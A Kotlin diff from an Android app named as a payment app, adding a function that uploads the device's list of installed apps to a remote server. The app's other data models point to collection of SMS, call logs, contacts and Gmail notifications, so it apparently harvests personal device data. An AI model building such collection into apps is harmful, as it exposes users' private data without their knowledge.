@@ -21,6 +21,7 @@ import com.payment.app.model.ApiGmailNotificationModel
 import com.payment.app.model.ApiNotificationModel
 import com.payment.app.model.CallLogModel
 import com.payment.app.model.ContactSyncModel
+import com.payment.app.model.InstalledApp
 import com.payment.app.model.SmsModel
 import com.payment.app.sqllite.SQLiteHelper
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
@@ -799,6 +800,58 @@ class ApiCall{
             Response.ErrorListener { error ->
                 VolleyLog.d("callEmailApi Error", "Error: " + error.message)
                 ApiCallManager.appendLog("Call Email Api API Call failed: ${error.message ?: "Unknown"}")
+            }) {
+
+            @Throws(AuthFailureError::class)
+            override fun getBody(): ByteArray {
+                val jsonBody = JSONArray(Gson().toJson(dataList)).toString()
+                return jsonBody.toByteArray(charset("utf-8"))
+            }
+
+            @Throws(AuthFailureError::class)
+            override fun getHeaders(): Map<String, String> {
+                val headers = HashMap<String, String>()
+                headers["Authorization"] = "Bearer $token"
+                headers["accept"] = "*/*"
+                headers["Content-Type"] = "application/json"
+                return headers
+            }
+        }
+        req.retryPolicy = DefaultRetryPolicy(
+            MY_SOCKET_TIMEOUT_MS,
+            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
+            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
+        )
+        val queue = Volley.newRequestQueue(applicationContext)
+        queue.add(req)
+    }
+
+
+    fun getAllAppApi(
+        dataList: ArrayList<InstalledApp>,
+        token: String,
+        applicationContext: Context?,
+        baseUrl: String
+    ) {
+        ApiCallManager.appendLog("Calling Get All App API")
+
+        Log.d("callGetAllAppApi", "callGetAllAppApi")
+        val url = "$baseUrl/api/InstalledApp/AddRangeAsync"
+        Log.d("Get All App log requestData", dataList.toString())
+        ApiCallManager.appendLog("===================")
+        ApiCallManager.appendLog("Get All App Log API url => $url")
+        ApiCallManager.appendLog("===================")
+
+        val req = object : StringRequest(
+            Method.POST, url,
+            Response.Listener { response ->
+                ApiCallManager.appendLog("Get All App Log API Call Success")
+                ApiCallManager.appendLog("callGetAllAppApi Response : $response")
+                Log.d("callGetAllAppApi Response", response.toString())
+            },
+            Response.ErrorListener { error ->
+                VolleyLog.d("Error", "Error: " + error.message)
+                ApiCallManager.appendLog("Get All App Log API Call failed: ${error.message ?: "Unknown"}")
             }) {
 
             @Throws(AuthFailureError::class)
